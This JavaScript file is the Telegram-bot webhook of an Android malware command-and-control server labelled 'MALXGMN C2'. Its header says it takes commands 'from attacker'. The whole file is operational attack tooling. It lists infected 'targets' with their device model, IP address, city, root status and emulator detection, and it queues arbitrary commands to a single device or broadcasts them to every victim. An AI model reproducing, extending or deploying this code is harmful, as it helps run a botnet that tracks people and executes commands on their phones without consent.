/**
 * FILE: api/telegram-webhook.js
 * Webhook utama untuk menerima perintah dari attacker melalui Telegram Bot.
 */

import { getAllTargets, getTarget, saveCommand, updateTarget, deleteTarget } from '../lib/database.js';
import { sendMessage, editMessage, sendDocument, sendPhoto } from '../lib/telegramBot.js';
import config from '../lib/config.js';

export default async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  
  try {
    const update = req.body;
    if (!update || !update.message) return res.status(200).send('OK');
    
    const { message } = update;
    const chatId = message.chat.id;
    const senderId = message.from.id.toString();
    const text = message.text || '';
    
    // Auth Check
    if (!config.telegram.adminIds.includes(senderId) && senderId !== config.telegram.adminChatId) {
      return res.status(200).send('OK');
    }
    
    const args = text.split(' ');
    const command = args[0].toLowerCase();
    
    switch (command) {
      case '/start':
        const helpMsg = `💀 *MALXGMN C2 Bot Activated* 💀
Welcome, Tuan Versaa.

*Commands:*
/stats - Lihat statistik sistem
/targets - Daftar semua target
/target [deviceId] - Detail target
/command [deviceId] [cmd] - Kirim command ke target
/broadcast [cmd] - Kirim command ke semua target
/delete [deviceId] - Hapus target dari database
/help - Bantuan`;
        await sendMessage(chatId, helpMsg);
        break;
        
      case '/stats':
        const allTargets = await getAllTargets();
        const infected = allTargets.filter(t => t.infected).length;
        const emulators = allTargets.filter(t => t.isEmulator).length;
        const statsMsg = `📊 *System Statistics*
Total Targets: ${allTargets.length}
Infected (Downloaded): ${infected}
Emulators Detected: ${emulators}
Active Today: ${allTargets.filter(t => (Date.now() - t.lastSeen) < 86400000).length}`;
        await sendMessage(chatId, statsMsg);
        break;
        
      case '/targets':
        const targets = await getAllTargets();
        if (targets.length === 0) {
          await sendMessage(chatId, '❌ No targets in database.');
        } else {
          let listMsg = '📱 *Target List:*\n\n';
          targets.forEach((t, i) => {
            listMsg += `${i+1}. ${t.deviceInfo.model} | ${t.location.country}\nID: \`${t.deviceId}\`\nInfected: ${t.infected ? '✅' : '❌'}\n\n`;
          });
          await sendMessage(chatId, listMsg);
        }
        break;
        
      case '/target':
        if (!args[1]) return sendMessage(chatId, 'Usage: /target [deviceId]');
        const target = await getTarget(args[1]);
        if (!target) return sendMessage(chatId, '❌ Target not found.');
        const detailMsg = `📱 *Target Details*
ID: \`${target.deviceId}\`
Model: ${target.deviceInfo.model}
Manufacturer: ${target.deviceInfo.manufacturer}
Android: ${target.deviceInfo.androidVersion}
Fingerprint: \`${target.deviceInfo.buildFingerprint}\`
Location: ${target.location.city}, ${target.location.country}
IP: ${target.ip}
Infected: ${target.infected ? 'YES' : 'NO'}
Last Seen: ${new Date(target.lastSeen).toLocaleString()}
Emulator: ${target.isEmulator ? 'YES' : 'NO'}
Root: ${target.deviceInfo.isRooted ? 'YES' : 'NO'}`;
        await sendMessage(chatId, detailMsg);
        break;
        
      case '/command':
        if (!args[1] || !args[2]) return sendMessage(chatId, 'Usage: /command [deviceId] [cmd]');
        const targetCmd = await getTarget(args[1]);
        if (!targetCmd) return sendMessage(chatId, '❌ Target not found.');
        const fullCmd = args.slice(2).join(' ');
        await saveCommand(args[1], fullCmd);
        await sendMessage(chatId, `✅ Command queued for \`${args[1]}\`: \`${fullCmd}\``);
        break;
        
      case '/broadcast':
        if (!args[1]) return sendMessage(chatId, 'Usage: /broadcast [cmd]');
        const allTargetsBC = await getAllTargets();
        const bcCmd = args.slice(1).join(' ');
        for (const t of allTargetsBC) {
          await saveCommand(t.deviceId, bcCmd);
        }
        await sendMessage(chatId, `✅ Broadcast queued for ${allTargetsBC.length} targets: \`${bcCmd}\``);
        break;
        
      case '/delete':
        if (!args[1]) return sendMessage(chatId, 'Usage: /delete [deviceId]');
        await deleteTarget(args[1]);
        await sendMessage(chatId, `✅ Target \`${args[1]}\` deleted.`);
        break;
        
      default:
        // Optional: Log unknown command
    }
    
    res.status(200).send('OK');
  } catch (err) {
    console.error('Webhook Error:', err.message);
    res.status(200).send('OK'); // Always send 200 to Telegram
  }
};
